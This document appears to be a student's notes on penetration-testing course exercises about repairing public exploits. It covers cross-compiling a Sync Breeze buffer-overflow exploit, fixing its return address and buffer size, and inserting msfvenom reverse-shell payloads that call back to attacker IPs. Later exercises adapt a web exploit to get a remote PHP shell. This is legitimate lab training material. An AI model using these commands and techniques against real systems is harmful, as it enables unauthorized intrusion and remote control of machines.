# 15.1.4 Cross-Compiling Exploit Code
**1.  Locate the exploit discussed in this section using the searchsploit tool in Kali Linux.**

We simply need to run the following command in order to find our exploit:
`searchsploit "Sync Breeze Enterprise 10.0.28"`

We can then copy the exploit to our working directory by using the -m command:
`searchsploit -m 42341`

**2.  Install the mingw-w64 suite in Kali Linux and compile the exploit code.**

In order to install mingw-w64 we need to run the following command:
`sudo apt install mingw-w64`

Upon viewing the code we see a few headers are included
```#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```

Doing a bit of research on winsock informs us that adding the lws2_32 flag should allow us to compile the program on our Kali machine. The following command will compile the code:
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

# 15.1.6 Changing the Socket Information
**1.  Modify the connection information in the exploit in order to target the SyncBreeze installation on your Windows client.**

In order to fix the exploit we simply need to open it in our text editor and modify the IP and port variables which are hard coded.
![[Pasted image 20220717201002.png]]

**2.  Recompile the exploit and use Wireshark to confirm that the code successfully initiates a socket connection to your dedicated Windows client.**

Once we modify the code we must recompile it before running the program. After the recompilation we can run the exe using wine. After executing the exe with wine we see the connection being made via Wireshark.
![[Pasted image 20220717232100.png]]
![[Pasted image 20220717232205.png]]

# 15.1.8 Changing the Return Address
**1.  Find any valid return address instruction and alter the one present in the original exploit.**

We can reuse our initial return address instruction we found in the previous exercise. All we need to do is replace the retn variable with our new instruction.
![[Pasted image 20220717233209.png]]


# 15.1.10 Changing the Payload
**1.  Generate a reverse shell payload using msfvenom while taking into account the bad characters of our exploit.**

To generate a new payload we can run the following MSFVenom command:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`

**2.  Replace the original payload with the newly generated one.**

We can now insert this payload into our exploit.
![[Pasted image 20220717233734.png]]

**3.  Attach the debugger to the target process and set a breakpoint at the return address instruction.**

We can now start the service, attach the debugger, and set a breakpoint (F2) at our return instruction.
![[Pasted image 20220717233911.png]]
![[Pasted image 20220717233936.png]]

**4.  Compile the exploit and run it. Did you hit the breakpoint?**

We compile the exploit with the following command:
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

Running the command with wine
`wine syncbreeze_exploit.exe `

Unfortunately, we do not hit our breakpoint and instead the program crashes at 0x9010090c
![[Pasted image 20220717234314.png]]

# 15.1.12 Changing the Overflow Buffer
**1.  Fix the overflow buffer such that the EIP register will be overwritten by your chosen return address instruction.**
Because the exploit is setting the last byte of our buffer to a null byte we must increase our buffer size by 1. We can do this by simply adjusting the "initial_buffer_size" variable from 780 to 781. Recompiling and running this changed exploit we can see we hit our breakpoint.
![[Pasted image 20220717235304.png]]

And letting the program finish running we can see we get our reverse shell.
![[Pasted image 20220717235336.png]]


**2.  Install the _ASX to MP3 Converter_ application located under the C:\Tools\fixing_exploits directory; download the exploit for _ASX to MP3 Converter_ from EDB[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/fixing-exploits/fixing-memory-corruption-exploits/practice-changing-the-overflow-buffer#fn1) and edit it in order to get a shell on your dedicated Windows machine.**

We can start by opening up the PoC exploit and replacing the shellcode with one we generated on our own.  We will be using the python PoC exploit labeled  To generate we use the following MSFVenom command (note the bad characters, information we gained from an internet search):
`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=9000 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a"`



# 15.2.4 Changing Connectivity Information
**1.  Connect to your dedicated Linux lab client and start the apache2 service; the target web application is located under /var/www/https/.**
**2.  Modify the original exploit and set the _base_url_ variable to the correct IP address of your dedicated Linux lab client as well as the protocol to HTTPS.**
**3.  Get familiar with the _requests_ Python library and adjust your exploit accordingly to avoid SSL verification.**
**4.  Edit the _username_ and _password_ variables to match the ones from our test case (username "admin", password "HUYfaw763").**
**5.  Try to run the exploit against the Linux lab client, does it work? If not, try to explain why.**


# 15.2.6 Troubleshooting the "index out of range" Error
**1.  Observe the error that is generated when running the exploit.**
**2.  Attempt to troubleshoot the code and determine why the error occurs.**
**3.  Modify the exploit in order to avoid the error and run it against your dedicated Linux client.**
**4.  Verify that your exploit worked by attempting to execute the _whoami_ command using the remote php shell.**
**5.  Attempt to obtain a fully interactive shell with this exploit.**